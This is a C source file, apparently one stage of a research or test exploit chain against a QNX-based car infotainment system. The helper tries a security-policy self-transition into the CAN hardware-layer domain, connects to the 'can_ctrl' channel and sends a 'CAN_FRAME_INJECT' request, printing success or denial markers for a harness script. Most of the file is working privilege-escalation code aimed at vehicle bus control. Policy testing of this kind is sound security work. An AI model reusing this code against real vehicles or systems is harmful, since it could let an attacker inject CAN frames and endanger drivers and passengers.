/*
 * diag_helper.c — QNX Neutrino 8.0 Diagnostic Bridge Helper (Hop 2)
 *
 * Spawned under `diag_helper_t` by `ivi_exploit`.
 * Attempts:
 *   1. `secpol_transition_type(NULL, "can_hal_t", 0)` (self-transition into can_hal_t)
 *   2. `name_open("can_ctrl", 0)` (resolves `/dev/name/local/can_ctrl`, permitted via
 *      `allow can_hal_t self : channel connect;` once transitioned to `can_hal_t`) + `MsgSend`
 *
 * Emits machine-parseable markers for harness/observe.py:
 *   HOP2_TRANSITION=OK | HOP2_TRANSITION=DENIED errno=<n>
 *   HOP2_RESULT=GRANTED reply=<msg> | HOP2_RESULT=DENIED errno=<n>
 */

#include <errno.h>
#include <secpol/secpol.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/dispatch.h>
#include <sys/neutrino.h>
#include <unistd.h>

#define CAN_ATTACH_NAME "can_ctrl"

int main(void) {
    printf("DIAG_HELPER_START pid=%d\n", (int)getpid());
    fflush(stdout);

    if (secpol_transition_type(NULL, "can_hal_t", 0) == -1) {
        int err = errno;
        printf("HOP2_TRANSITION=DENIED errno=%d (%s)\n", err, strerror(err));
        fflush(stdout);
    } else {
        printf("HOP2_TRANSITION=OK target=can_hal_t\n");
        fflush(stdout);
    }

    int coid = name_open(CAN_ATTACH_NAME, 0);
    if (coid == -1) {
        int err = errno;
        printf("HOP2_RESULT=DENIED errno=%d (%s)\n", err, strerror(err));
        fflush(stdout);
        return EXIT_FAILURE;
    }

    const char *req = "CAN_FRAME_INJECT";
    char reply[64];
    memset(reply, 0, sizeof(reply));

    if (MsgSend(coid, req, strlen(req) + 1, reply, sizeof(reply) - 1) == -1) {
        int err = errno;
        printf("HOP2_RESULT=DENIED errno=%d (%s)\n", err, strerror(err));
        fflush(stdout);
        name_close(coid);
        return EXIT_FAILURE;
    }

    printf("HOP2_RESULT=GRANTED reply=%s\n", reply);
    fflush(stdout);
    name_close(coid);
    return EXIT_SUCCESS;
}
